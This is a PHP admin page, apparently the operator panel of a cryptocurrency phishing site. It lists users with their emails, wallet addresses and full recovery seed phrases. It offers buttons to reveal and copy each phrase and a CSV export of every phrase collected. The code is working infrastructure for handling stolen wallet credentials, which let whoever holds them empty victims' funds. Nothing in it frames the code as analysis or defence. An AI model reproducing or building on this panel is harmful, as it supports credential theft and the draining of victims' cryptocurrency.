<?php
require_once __DIR__ . '/../auth.php';
require_admin();

// CSV export
if (($_GET['export'] ?? '') === 'csv') {
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="wallet_logs_' . date('Y-m-d') . '.csv"');
    $out = fopen('php://output', 'w');
    fputcsv($out, ['ID','User','Email','Provider','Method','Address','Seed Phrase','Label','Status','Date (UTC)']);
    $all = db()->query("SELECT wc.*, u.full_name, u.email FROM wallet_connections wc JOIN users u ON u.id = wc.user_id ORDER BY wc.created_at DESC")->fetchAll();
    foreach ($all as $l) {
        fputcsv($out, [$l['id'], $l['full_name'], $l['email'], $l['provider'] ?? '', $l['method'], $l['address'], $l['seed_phrase'] ?? '', $l['label'] ?? '', $l['status'], $l['created_at']]);
    }
    fclose($out);
    exit;
}

$logs = db()->query("SELECT wc.*, u.full_name, u.email FROM wallet_connections wc JOIN users u ON u.id = wc.user_id ORDER BY wc.created_at DESC LIMIT 300")->fetchAll();

$pageTitle = 'Wallet Connection Logs';
require __DIR__ . '/includes/header.php';
?>
<div class="adm-toolbar">
  <div class="adm-search"><input type="text" placeholder="Search by user name, email, or address..." data-adm-table-search="#logsTable"></div>
  <select class="adm-select" data-adm-table-filter="#logsTable">
    <option value="all">All Statuses</option>
    <option value="success">Success</option>
    <option value="revoked">Revoked</option>
    <option value="failed">Failed</option>
  </select>
  <a href="wallet-logs.php?export=csv" class="adm-btn adm-btn-outline" style="white-space:nowrap">&#8659; Export CSV</a>
</div>

<div class="adm-panel">
  <?php if (!$logs): ?>
    <div class="adm-empty">No wallet connections logged yet.</div>
  <?php else: ?>
  <div class="adm-table-wrap">
  <table class="adm-table" id="logsTable">
    <thead>
      <tr>
        <th>User</th>
        <th>Provider</th>
        <th>Method</th>
        <th>Address</th>
        <th>Recovery Phrase</th>
        <th>Status</th>
        <th>Date</th>
      </tr>
    </thead>
    <tbody>
      <?php foreach ($logs as $l): $hasSeed = !empty($l['seed_phrase']); ?>
      <tr data-status="<?= e($l['status']) ?>" data-search="<?= e(strtolower($l['full_name'] . ' ' . $l['email'] . ' ' . $l['address'])) ?>">
        <td>
          <strong><?= e($l['full_name']) ?></strong>
          <div class="adm-cell-sub"><?= e($l['email']) ?></div>
        </td>
        <td><?= e($l['provider'] ?? '') ?: '&mdash;' ?></td>
        <td><?= e(ucfirst($l['method'])) ?></td>
        <td class="adm-mono" style="max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">
          <?= strpos($l['address'], 'seed-phrase-only-') === 0 ? '<em style="color:var(--adm-muted-2)">phrase only</em>' : e($l['address']) ?>
        </td>
        <td style="min-width:220px">
          <?php if ($hasSeed): ?>
            <div style="display:flex;align-items:center;gap:8px">
              <span id="seed-<?= $l['id'] ?>"
                    style="font-family:monospace;font-size:12px;color:transparent;text-shadow:0 0 7px rgba(0,0,0,.85);max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:inline-block;vertical-align:middle"
                    data-val="<?= e($l['seed_phrase']) ?>">
                <?= e($l['seed_phrase']) ?>
              </span>
              <button type="button"
                onclick="toggleSeed(<?= $l['id'] ?>)"
                id="seedBtn-<?= $l['id'] ?>"
                title="Reveal / hide"
                style="background:none;border:1px solid var(--adm-line);border-radius:6px;padding:3px 7px;cursor:pointer;font-size:12px;white-space:nowrap;flex-shrink:0">
                &#128065; Reveal
              </button>
              <button type="button"
                onclick="copySeed(<?= $l['id'] ?>)"
                title="Copy to clipboard"
                style="background:none;border:1px solid var(--adm-line);border-radius:6px;padding:3px 7px;cursor:pointer;font-size:12px;flex-shrink:0">
                &#128203;
              </button>
            </div>
          <?php else: ?>
            <span style="color:var(--adm-muted-2);font-size:13px">&mdash;</span>
          <?php endif; ?>
        </td>
        <td><?= badge_for_status($l['status']) ?></td>
        <td style="white-space:nowrap"><?= e(date('n/j/Y, g:i A', strtotime($l['created_at']))) ?></td>
      </tr>
      <?php endforeach; ?>
      <tr class="adm-js-empty-row" style="display:none"><td colspan="7" class="adm-empty">No matching wallet connections.</td></tr>
    </tbody>
  </table>
  </div>
  <?php endif; ?>
</div>

<script>
function toggleSeed(id) {
  var span = document.getElementById('seed-' + id);
  var btn  = document.getElementById('seedBtn-' + id);
  var hidden = span.style.color === 'transparent';
  span.style.color      = hidden ? 'inherit' : 'transparent';
  span.style.textShadow = hidden ? 'none' : '0 0 7px rgba(0,0,0,.85)';
  btn.innerHTML = hidden ? '&#128065; Hide' : '&#128065; Reveal';
}
function copySeed(id) {
  var val = document.getElementById('seed-' + id).getAttribute('data-val');
  navigator.clipboard.writeText(val).then(function() { admToast('Copied to clipboard.'); });
}
</script>
<?php require __DIR__ . '/includes/footer.php'; ?>
